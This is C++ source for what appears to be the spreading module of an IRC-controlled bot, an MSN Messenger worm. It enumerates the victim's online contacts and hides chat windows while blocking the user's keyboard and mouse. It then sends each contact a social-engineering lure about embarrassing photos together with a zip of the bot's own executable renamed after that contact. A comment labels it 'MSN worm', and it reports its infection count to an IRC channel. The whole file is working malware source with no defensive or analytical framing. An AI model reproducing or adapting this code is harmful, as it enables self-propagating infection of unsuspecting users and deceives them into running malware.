#include "../h/Includes.h"
#include "../h/Functions.h"
#include "../h/Externs.h"

#include <winable.h>

#include <winable.h>

#import "MSNMessengerAPI.tlb" named_guids, no_namespace

static const char *msg_english[] = {
  "Sup, seen the pictures from the other night?",
  "Hey m8, who is this on the right, in this picture...",
  "Should I put this on facebook/myspace?",
  "LOL, you look so ugly in this picture, no joke...",
  "WoW? is that really you... what the hell where you drinking :D",
  NULL
};

int randget(const char *messages[]) {
	int i = 0;
	for(;messages[i] != NULL;i++);
	return (rand() % i);
}

char *stristr2(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			/*
			 * while string length not shorter than pattern length
			 */
			slen >= plen; start++, slen--) {
		/*
		 * find start of pattern in string
		 */
		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;

			/*
			 * if pattern longer than string
			 */

			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;

			/*
			 * if end of pattern then pattern was found
			 */

			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}


void key_type(char* text, HWND hwnd)
{

HGLOBAL hData;

LPVOID pData;

OpenClipboard(hwnd);

EmptyClipboard();

hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1); //crash

pData = GlobalLock(hData);

strcpy((LPSTR)pData, text);

GlobalUnlock(hData);



SetClipboardData(CF_TEXT, hData);

CloseClipboard();

}


void dropfiles(HWND hwnd, char *email){
    char windir[260];
	char szFiles[260];
	char emaildir[MAX_PATH];

	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\pic0382.zip");//this is not easy tbh, needs additional coding  oh,h w,h at to remove the @hotmail.com co.uk etc, maybe try ripping some part of the code above
	//sprintf(windir, "%s\\%s", windir1, filename);

	GetWindowsDirectory(emaildir, sizeof(emaildir));
	strcat(emaildir, "\\");
	strcat(emaildir, email);// i guess u wanna block ryan for now incase he sends that exe again on bot.fo.r ums umm ioll use a diffrent hotmail ye better
	strcat(emaildir, ".zip");

	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);
 
	CopyFile(szFiles, emaildir, FALSE);
	strcpy(szFiles, emaildir);

	/*char testbuf[1024];
	sprintf( testbuf, "email = %s\nszFiles = %s\nemaildir = %s",
		email,
		szFiles,
		emaildir);
	MessageBox(0, testbuf, "", MB_OK);*/

if (::OpenClipboard (hwnd)) {
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}


	//DeleteFile(emaildir);
}

void contactfuck(char *contact)
{
	IMSNMessenger *pIMessenger = NULL;

	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger,
		(void **)&pIMessenger);

	if (SUCCEEDED(hr))
	{
		pIMessenger->AddContact(0, contact);
	}
	pIMessenger->Release();
	CoUninitialize();
}



void imfuck(SOCKET sock)
{
	const char *msgg;
	
	srand(GetTickCount());
	msgg = *(&msg_english[randget(msg_english)]);

	char fakename[] = "pic0382.zip";

	char windir[MAX_PATH];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir, "\\");
	strcat(windir, fakename);


/*	
	strcat(windir,"\\photo album.zip");
	//sprintf(windir, "%s\\%s", windir1, filename);
	if(GetFileAttributes(windir) == INVALID_FILE_ATTRIBUTES) { //file doesnt exist
		char dir[MAX_PATH];
		GetModuleFileName(NULL, dir, MAX_PATH);

		//char mbuf[1024];
		//sprintf(mbuf, "zip_store(\n%s,\n%s,\n%s\n);", dir, windir, "photo album2007.pif");
		//MessageBox(NULL, mbuf, "", MB_OK);
		zip_store(dir, windir, "photo album2007.pif");
	}*/

	IMSNMessenger *pIMessenger = NULL;
	
	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger,
		(void **)&pIMessenger);

	if (SUCCEEDED(hr))
	{
	//	char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;

			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					int x = 0;
					for (long i = 0; i < iContacts; i++)
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);

								_bstr_t tmp = szContactName;
								char buf[128];
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);

								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;

								strcat(buf, ".exe");//retry plz

								//FILE *fp;
								//if( (fp = fopen(windir, "r")) == NULL) {
									char exepath[MAX_PATH];
									GetModuleFileName(NULL, exepath, MAX_PATH);

									zip_store(exepath, windir, buf); //retry now
								//}
								//else fclose(fp);

								/*char bigtemp[1024];
								sprintf(bigtemp, "exepath = %s\nwindir = %s\nbuf = %s",
									exepath,
									windir,
									buf);
									MessageBox(0, bigtemp, "", MB_OK);*/ 

								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void**)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										ShowWindow((HWND) wndIM,0);	
										srand(GetTickCount());										
                                        int i = rand() % sizeof(msgg) / sizeof(msgg[0]);
                                        //key_type((char *)msgg[i], (HWND) wndIM); //crash
										key_type((char *)msgg, (HWND) wndIM);
										//key_type("hey, can you check this photo out..", (HWND) wndIM); //crash
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										Sleep(50);
										dropfiles((HWND) wndIM, buf);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                        
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);																			
										x++;
									}
									pIMessengerWindow->Release();
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					//sprintf(msg,  "PRIVMSG %s :MSN worm sent to: %d contacts\n", channel, x);
	                //send(sock, msg, strlen(msg), 0);
					char buf[128];
					sprintf(buf, "Message has been sent to %d contacts!", x);
					//enc_privmsg(sock, "#seek", buf, 0);
					irc_privmsg(sock, channel, buf, 0);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();

	//return 0;
}

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 


void AddContact(char *email) {
	IMSNMessenger *MSN = NULL;
	CoInitialize(0);
	HRESULT HR = CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL,IID_IMSNMessenger,(void **)&MSN);
	if(SUCCEEDED(HR)) {
		MSN->AddContact(NULL, email);
	}
	BlockInput(1);
	Sleep(500);
	keybd_event(VK_RETURN, 0, 0, 0);
	BlockInput(0);
}